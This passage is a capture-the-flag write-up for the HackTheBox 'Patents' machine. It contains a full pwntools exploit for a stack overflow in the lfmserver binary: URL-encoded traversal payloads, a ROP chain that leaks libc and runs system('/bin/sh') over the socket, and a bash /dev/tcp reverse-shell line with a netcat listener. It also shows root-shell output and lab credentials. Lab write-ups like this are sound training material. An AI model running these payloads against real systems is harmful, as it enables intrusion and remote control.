  local_src = (undefined2 *)src;
  while ((*(char *)local_src != '\0' && (local_max = local_max + -1, local_max != 0))) {
    if (*(char *)local_src == '%') {
      local_src = (undefined2 *)((long)local_src + 1);
      nptr = *local_src;
      res = strtoul((char *)&nptr,(char **)0x0,0x10);
      *local_dest = (char)res;
      local_dest = local_dest + 1;
      local_src = local_src + 1;
    }
    else {
      *local_dest = *(char *)local_src;
      local_dest = local_dest + 1;
      local_src = (undefined2 *)((long)local_src + 1);
    }
  }
  *local_dest = '\0';
  return;
}
```

## Exploiting the binary
Now that we have gathered enough information about the binary, let us prepare to exploit the binary.
### Exploit preperation
In order to exploit the binary we have to preperate a few things. We will need to have a copy of the used libc version. Furthermore, we will need a way to url-encode all characters in python and get a MD5-sum of a file from the server. After we have prepared all of that, we need to find a way to leak an address from libc to calculate the libc-base and then finally redirect stdin, stdout and stderr to the socket, which needs to be brute forced.

#### Getting libc
Using [libc-database](https://github.com/niklasb/libc-database) we can download the libc version used on the server.

```bash
root@silence:~# libc-database/download libc6_2.28-0ubuntu1_amd64
Getting libc6_2.28-0ubuntu1_amd64
  -> Location: http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc//libc6_2.28-0ubuntu1_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.28-0ubuntu1_amd64

root@silence:~# cp libc-database/libs/libc6_2.28-0ubuntu1_amd64/libc.so.6 .
```

#### URL-encoding all characters
In order to send the payload successfully, we have to url-encode **all characters**. Default python url-encoding does only encode certain key-characters. Luckily after a bit of searching, I found a [script on GitHub](https://gist.github.com/Paradoxis/6336c2eaea20a591dd36bb1f5e227da2#file-url_encode-py) that encodes all characters.

#### MD5-sum of file
Another prerequisite for our exploit, is that we know the MD5-sum of the file we are accessing. There are multiple possible files we can choose from. Initially I decided to use `/dev/null`, as it will definitly has the same MD5-sum on my machine as on the target. However, because of problems that occured in later exploit-development I changed to use `/proc/sys/kernel/randomize_va_space`.

```bash
root@silence:~# md5sum /dev/null
d41d8cd98f00b204e9800998ecf8427e  /dev/null

root@silence:~# md5sum /proc/sys/kernel/randomize_va_space
26ab0db90d72e28ad0ba1e22ee510510  /proc/sys/kernel/randomize_va_space
```

```python
Request:
CHECK %2f%2e%2e%2f%2e%2e%2f%2e%2e/dev/null LFM
User=lfm_user
Password=!gby0l0r0ck$$!

d41d8cd98f00b204e9800998ecf8427e
```
```python
Response:
LFM 200 OK
Size: 32
```

#### Leaking libc-base
We can use write to leak any libc function and calculate the offset.
```bash
root@silence:~# objdump -D lfmserver -M intel | grep "write"
0000000000402420 <write@plt>:
  4025d7:       e8 44 fe ff ff          call   402420 <write@plt>
```
```c
root@silence:~# man 2 write
WRITE(2)                                     Linux Programmer's Manual                                     WRITE(2)

NAME
       write - write to a file descriptor

SYNOPSIS
       #include <unistd.h>

       ssize_t write(int fd, const void *buf, size_t count);
[...]
```
In order to leak any libc function, we have to define where to write to, what to write and how long the data will be. Our connection socket is not known, however we can guess it. The address is 8 bytes long.

Let us check which functions we can leak:
```python
root@silence:~# python3
Python 3.8.3rc1 (default, Apr 30 2020, 07:33:30)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> binary = ELF('./lfmserver',checksec=False)
>>> libc = ELF('./libc.so.6',checksec=False)
>>> for got in binary.got:
...     for lib in libc.symbols:
...             if got == lib:
...                     print(got)
...
_libc_start_main
stderr
stdout
dup2
pause
memset
snprintf
close
pthread_cond_signal
htons
openlog
exit
strcasecmp
read
strncmp
malloc
fopen
```
We have a lot of functions to choose from. Let us just use dup2, as it is the first function that is listed.

#### Redirecting stdin, stdout and stderr to the socket
Using dup2 we can redirect stdin, stdout and stderr to the socket.

```c
root@silence:~# man 2 dup2
DUP(2)                                       Linux Programmer's Manual                                       DUP(2)

NAME
       dup, dup2, dup3 - duplicate a file descriptor

SYNOPSIS
       #include <unistd.h>

       int dup(int oldfd);
       int dup2(int oldfd, int newfd);
[...]
```
In order to do so, we have to call dup2 with socket (not known yet) as the old fd and 0 (stdin), 1 (stdout), 2 (stderr) as the newfd.

### Exploitation
The exploit will be developed using python3 with pwntools (4.1.0). This whole section will be an explaination of the key-elements of the exploit code. The complete code can be found on my [Github](https://github.com/chr0x6eos/HTB/blob/master/Patents/root.py).

#### Overflowing the buffer
My initial plan of using /dev/null as the file the read did not work. After a hint from the forum, I tried using `/proc/sys/kernel/randomize_va_space`. As most systems usually have ASLR enabled, the MD5-sum should match with the one from my machine.

```python
def overflow(FILE="/proc/sys/kernel/randomize_va_space"):
    payload = "../../../../../.."# "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e"
    payload = urlencode(payload)
    payload += FILE
    payload += "%x" # Inject invalid character that will write null bytes
    payload += urlencode("A" * 106) #Overflow # "%41" * 106
    return payload, genMD5(FILE)
```
The overflow function generates and returns a payload to overflow the buffer, as well as the md5sum of the file used.

#### Generating the requests
```python
def genReq(payload):
    junk, md5 = overflow(FILE)
    request = "CHECK /{JUNK}{PAYLOAD} LFM\r\nUser=lfmserver_user\r\n".format(JUNK=junk,PAYLOAD=urlencode(payload,True))
    request += "Password=!gby0l0r0ck$$!\r\n\r\n{md5}\n".format(md5=md5)
    return request
```
The genReq function calls the overflow function and generates a valid request with the inputted payload to exploit the binary.

The payload is URL-encoded using the previously mentioned function from GitHub.
```python
def urlencode(data, bytes=False):
    if bytes: # Don't use ord if already bytes
        return "".join("%{0:0>2}".format(format(c, "x")) for c in data)
    else:
        return "".join("%{0:0>2}".format(format(ord(c), "x")) for c in data)
```

#### Leaking libc-base
```python
def leak(fd):
    try:
        io = start()
        log.info("Trying fd: %d" % fd)
        rop = ROP([binary])

        # call write(fd, dup2@got, 8);
        rop.raw(pop_rdi)
        rop.raw(fd)
        rop.raw(pop_rsi)
        rop.raw(binary.got['dup2']) # function to leak, can be any function
        rop.raw(0x0) # for r15
        rop.raw(nop)
        # rdx is 8
        rop.raw(binary.symbols['write'])

        io.sendline(genReq(bytes(rop)))

        # Recv junk
        io.recvuntil("Size: 32",timeout=3)
        io.recvline(timeout=3)
        io.recvline(timeout=3)
        io.recvline(timeout=3)

        leak = u64(io.recv().rstrip()[1:7].ljust(8, b'\x00'))
        io.close()
        clear(3)

        # Check if leak is plausible
        if leak < libc.symbols['dup2']:
            raise Exception("Leak not plausible!")

        libc.address = leak - libc.symbols['dup2']
        clear()
        log.success("Leaked libc-base: %s" % hex(libc.address))
        return True
    except:
        return False
```
Now with the genRequest setup, the rest of the exploitation is just simple rop. The gadgets can be acquired using any tool. I used ropper to get the gadgets:
```python
# ropper --file lfmserver
pop_rdi = 0x0405c4b #0x0405c4b: pop rdi; ret;
pop_rsi = 0x0405c49 #0x0405c49: pop rsi; pop r15; ret;
nop     = 0x040251f #0x040251f: nop; ret;
```
We use write to leak dup2@got and calculate the libc base address. I simply manually brute forced the fd (using a for loop), until I got a valid result.

#### Ropchain for popping a shell
With the libc base address leaked, we use a simple ropchain to redirect stdin, stdout and stderr to the socket and then call system(/bin/sh).
```python
def genRopchain(fd):
    rop = ROP([binary,libc])

    rop.dup2(fd, 0)
    rop.dup2(fd, 1)
    rop.dup2(fd, 2)

    rop.system(next(libc.search("/bin/sh")))
    return bytes(rop)
```
Pwntools luckily can do all the heavy lifting and gives us an easy way to redirect stdin, stdout and stderr to the socket fd and calls system with /bin/sh.

```python
def sendPayload(fd):
    io = start()
    rop = genRopchain(fd)
    io.sendline(genReq(rop))
    return io
```
Now we just need to call the genRopchain function and send the ropchain to the server.

#### Final exploit
```python
def exploit():
    try:
        for fd in range(3, 10):
            if leak(fd):
                log.success("Found fd: %d" % fd)
                shell = sendPayload(fd)
                clear(2)
                if args.REV:
                    ip = get_ip_address("tun0")
                    log.info("Setup your listener! [nc -lvnp 443]")
                    while True:
                        done = input("Send payload? [Y/n] ").rstrip()
                        if done in ["Y","y",""]:
                            clear()
                            shell.sendline("bash -c 'bash -i >& /dev/tcp/{IP}/443 0>&1'".format(IP=ip))
                            log.success("Reverse-shell payload send!")
                            shell.close()
                            clear()
                            break
                        clear()
                    return True
                else:
                    shell.sendline("id")
                    shell.interactive()
                    return True
    except Exception as ex:
        log.warning(ex)
        return False
```
All fds from 3 to 10 are brute forced. If the fd is found, the final payload is send using sendPayload, which either gets us a shell or a reverse-shell, depending on user-input.

### Getting shell as root
```python
root@silence:~# python3 exploit3.py
[*] '/root/lfmserver'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Leaked libc-base: 0x7f6f4454f000
[+] Found fd: 6
[*] Switching to interactive mode
LFM 200 OK
Size: 32

26ab0db90d72e28ad0ba1e22ee510510
uid=0(root) gid=0(root) groups=0(root)
$ hostname
patents
$ whoami
root
```
The shell proved to be quite instable, so I added a functionality to quickly get a reverse-shell.
```python
root@silence:~# python3 exploit3.py REV
[*] '/root/lfmserver'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Leaked libc-base: 0x7f6f4454f000
[+] Found fd: 6
[*] Setup your listener! [nc -lvnp 443]
Send payload? [Y/n]

root@silence:~# nc -lvnp 443
listening on [any] 443 ...

connect to [10.10.14.23] from (UNKNOWN) [10.10.10.173] 59558
bash: cannot set terminal process group (1248): Inappropriate ioctl for device
bash: no job control in this shell
root@patents:/opt/checker_server#
```
Now that we have a shell, let us read root.txt.
```bash
root@patents:~# ls -alh
ls -alh
total 23K
drwxr-xr-x  7 root root 1.0K Dec  3 14:25 .
drwxr-xr-x 23 root root 4.0K Jan 12 00:03 ..
lrwxrwxrwx  1 root root    9 May 22  2019 .bash_history -> /dev/null
drwx------  2 root root 1.0K May 21  2019 .cache
drwx------  3 root root 1.0K May 21  2019 .gnupg
drwxr-xr-x  3 root root 1.0K Dec  3 14:25 .local
drwx------  2 root root  12K May 21  2019 lost+found
drwxr-xr-x  3 root root 1.0K May 21  2019 snap
-rw-------  1 root root 1.6K May 22  2019 .viminfo
```
Seems like the root.txt is not here! Let us enumerate the machine to find the root.txt.

## Enumerating the server to find root.txt
```bash
root@patents:~# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0 54.9M  1 loop /snap/lxd/12631
loop1    7:1    0 66.7M  1 loop /snap/lxd/9239
loop2    7:2    0 89.1M  1 loop /snap/core/8268
loop3    7:3    0 54.2M  1 loop /snap/lxd/10756
loop4    7:4    0 89.1M  1 loop /snap/core/8039
sda      8:0    0   25G  0 disk
├─sda1   8:1    0    1M  0 part
├─sda2   8:2    0   16G  0 part /
├─sda3   8:3    0    1G  0 part /boot
└─sda4   8:4    0    2G  0 part /home
sdb      8:16   0  512M  0 disk
└─sdb1   8:17   0  511M  0 part /root
sr0     11:0    1 1024M  0 rom
```
Listing all disks, we can see that sda2 is mounted on /, but sdb1 is mounted on root.
Let us mount sda2 on /mnt/ and see if we find root.txt then.
```bash
root@patents:~# mount /dev/sda2 /mnt/
root@patents:~# cd /mnt/root/; ls
root.txt
secret
snap
```
Now that we have mounted sda2, we can finally read root.txt.
```bash
root@patents:/mnt/root# cat root.txt
d63b0***************************
root@patents:/# umount /mnt/
```
